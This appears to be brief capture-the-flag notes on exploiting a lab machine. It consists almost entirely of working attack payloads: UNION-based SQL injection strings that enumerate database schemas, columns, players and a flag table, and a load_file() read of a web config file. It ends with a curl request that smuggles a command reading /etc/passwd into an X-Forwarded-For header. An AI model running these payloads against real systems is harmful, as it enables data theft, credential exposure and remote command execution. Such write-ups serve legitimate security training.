we found sql injection

parament we did player=ippsec'-- -   it said same name

```
player=pencer' union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata -- -
player=pencer' union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA -- -

player=pencer' union select group_concat('TABLE:',TABLE_NAME,'---->-COLUMN:',COLUMN_NAME,'\n') from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'november' -- -

player=pencer' union select group_concat(player) from players -- -

player=pencer' union select group_concat(one) from flag -- -
```

then we logged in using

```
player=pencer' union select load_file('/var/www/html/config.php')
```

on machine there was a file firewall.php

it had x-forwsa-for so we did curl from our machine

```
curl -X GET -H 'X-FORWARDED-FOR: ;cat /etc/passwd;' --cookie "PHPSESSID=$PHPSESSID" 'http://10.10.11.128/firewall.php'
